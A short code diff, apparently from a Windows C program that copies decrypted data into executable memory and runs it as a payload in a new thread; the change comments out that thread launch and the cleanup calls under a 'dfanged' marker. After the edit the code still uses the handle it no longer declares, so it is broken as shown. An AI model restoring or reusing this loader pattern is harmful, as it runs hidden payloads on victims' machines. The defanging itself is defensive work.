@@ -185,12 +185,13 @@ int main() {
 	}
 
 	memcpy(pExecutableMemory, pPlaintext, dwPlainSize);
-
-	HANDLE hThread = CreateThread(NULL, 0, ExecutePayloadThread, pExecutableMemory, 0, NULL);
+	// dfanged
+	//HANDLE hThread = CreateThread(NULL, 0, ExecutePayloadThread, pExecutableMemory, 0, NULL);
 	if (hThread == NULL) {
 		printf("Error: Failed to create thread\n");
-		VirtualFree(pExecutableMemory, 0, MEM_RELEASE);
-		HeapFree(GetProcessHeap(), 0, pPlaintext);
+		// dfanged
+		//VirtualFree(pExecutableMemory, 0, MEM_RELEASE);
+		//HeapFree(GetProcessHeap(), 0, pPlaintext);
 		return -1;
 	}
 	CloseHandle(hThread);
